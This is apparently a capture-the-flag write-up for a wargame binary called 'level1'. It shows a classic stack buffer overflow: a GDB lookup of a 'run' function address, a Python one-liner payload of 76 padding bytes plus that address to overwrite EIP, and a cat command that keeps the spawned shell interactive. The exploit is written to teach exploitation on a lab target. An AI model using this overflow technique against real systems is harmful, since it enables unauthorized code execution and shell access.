After decompiling the code we can see a buffer of 76 bytes in the main and a run function that open a shell.

Using GDB we can see the run function address

```Console
(gdb) info function
[...]
0x08048444  run
[...]

```

Using python we create an input to fill our buffer and overwrite
the EIP registre with the run function address in little endian.

```Shell
python -c "print('A' * 76 + '\x44\x84\x04\x08')" > /tmp/input1

```

As we run level1 with our file as input the shell is non interactive and quit 
after executing the run function.To force the shell to be interactive we add 
`-` to our `cat` command to print stdin after the content of our file
and force the program to wait for user input.

```Shell
cat /tmp/input1 - | ./level1

```